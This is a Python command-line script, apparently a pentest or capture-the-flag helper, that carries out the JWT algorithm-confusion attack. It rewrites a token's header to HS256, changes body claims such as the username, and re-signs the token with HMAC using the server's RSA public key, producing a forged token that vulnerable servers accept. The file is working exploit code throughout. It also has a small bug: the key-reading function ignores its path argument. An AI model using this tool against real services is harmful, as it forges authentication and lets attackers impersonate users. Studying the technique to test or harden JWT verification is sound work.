import os
import json
import hmac
import base64
import logging
import hashlib
import argparse


log = logging.getLogger()
logging.basicConfig(format="[%(levelname)s]: %(message)s", level=logging.INFO)


# create a keyvalue class
class keyvalue(argparse.Action):
    # Constructor calling
    def __call__(self, parser, namespace, values, option_string=None):
        setattr(namespace, self.dest, dict())
        for value in values:
            # split it into key and value
            key, value = value.split("=")
            # assign into dictionary
            getattr(namespace, self.dest)[key] = value


def read_pubkey(pubkey_path):
    with open("jwt_key.pub", "rb") as fp:
        return fp.read()


def decode_part(part):
    b64decoded = base64.b64decode(part.encode()).decode()
    return json.loads(b64decoded)


def decode_jwt(jwt):
    header, body, _ = jwt.split(".")
    header = decode_part(header)
    body = decode_part(body)
    return (header, body)


def modify_jwt(part, key, value):
    part[key] = value
    return part


def modify_header(header):
    header["alg"] = "HS256"
    return header


def modify_body(kwargs, body):
    for key in kwargs:
        body[key] = kwargs[key]
    return body


def encode_part(part):
    string = json.dumps(part)
    encoded = base64.urlsafe_b64encode(string.encode()).decode().rstrip("=")
    # base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    return encoded


def sign(encoded_header, encoded_body, pubkey):
    data = f"{encoded_header}.{encoded_body}"
    hmac_sig = hmac.new(
        pubkey,
        msg=bytes(data, "utf-8"),
        digestmod=hashlib.sha256,
    ).digest()
    signature = base64.urlsafe_b64encode(hmac_sig).decode().rstrip("=")
    return signature


def main(args):
    pubkey_path = os.path.abspath(args.pubkey_path)
    log.info(f"Reading public key: {pubkey_path}")
    pubkey = read_pubkey(pubkey_path)

    log.info("Decoding JWT")
    header, body = decode_jwt(args.jwt)

    # Change header to HS256
    log.info("Modifying algorithm")
    new_header = modify_header(header)
    if args.kwargs:
        log.info("Modifying body elements")
        new_body = modify_body(args.kwargs, body)
    else:
        new_body = body

    log.info("Encoding")
    encoded_header = encode_part(new_header)
    encoded_body = encode_part(new_body)

    log.info("Signing JWT")
    signature = sign(encoded_header, encoded_body, pubkey)

    print("")
    print("New JWT:")
    print(f"{encoded_header}.{encoded_body}.{signature}")


def parser():
    parser = argparse.ArgumentParser(description="Encrypt JWT as HS256")
    parser.add_argument("pubkey_path")
    parser.add_argument("jwt")
    parser.add_argument(
        "--kwargs",
        nargs="*",
        action=keyvalue,
        help="Key value pairs to change in the body of the JWT: --kwargs 'user=trevor' 'another=change'",
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parser()
    main(args)
